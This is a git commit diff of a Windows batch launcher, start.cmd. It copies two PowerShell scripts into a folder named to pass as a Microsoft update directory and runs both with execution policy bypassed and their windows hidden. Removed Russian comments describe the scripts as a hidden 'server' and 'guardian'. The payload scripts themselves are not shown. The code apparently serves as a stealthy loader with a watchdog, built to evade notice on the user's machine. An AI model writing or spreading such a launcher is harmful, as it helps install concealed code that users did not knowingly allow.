e23ddf706f213b0c0c73ce24ccae0974b2b13dcd
NodeNode30-30 <fololop10@gmail.com>
2026-07-17 19:14:47 +0300

    Update script to use new runner and guardian files

--- start.cmd
+++ start.cmd
@@ -1,14 +1,8 @@
 @echo off
 set "WORKDIR=%USERPROFILE%\AppData\Local\Microsoft\MSUpdate"
-
-:: Проверяем, лежат ли файлы на месте, если запускаем из другой папки
 if not exist "%WORKDIR%" mkdir "%WORKDIR%"
-if exist "%~dp0runner.ps1" copy "%~dp0runner.ps1" "%WORKDIR%\runner.ps1" /Y >nul
-if exist "%~dp0guardian.ps1" copy "%~dp0guardian.ps1" "%WORKDIR%\guardian.ps1" /Y >nul
-
-:: Запускаем сервер и стража в скрытом режиме
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\runner.ps1"
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\guardian.ps1"
-
+copy "%~dp0runnerr.ps1" "%WORKDIR%\runnerr.ps1" /Y >nul 2>&1
+copy "%~dp0guardiann.ps1" "%WORKDIR%\guardiann.ps1" /Y >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\runnerr.ps1"
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\guardiann.ps1"
 exit
-
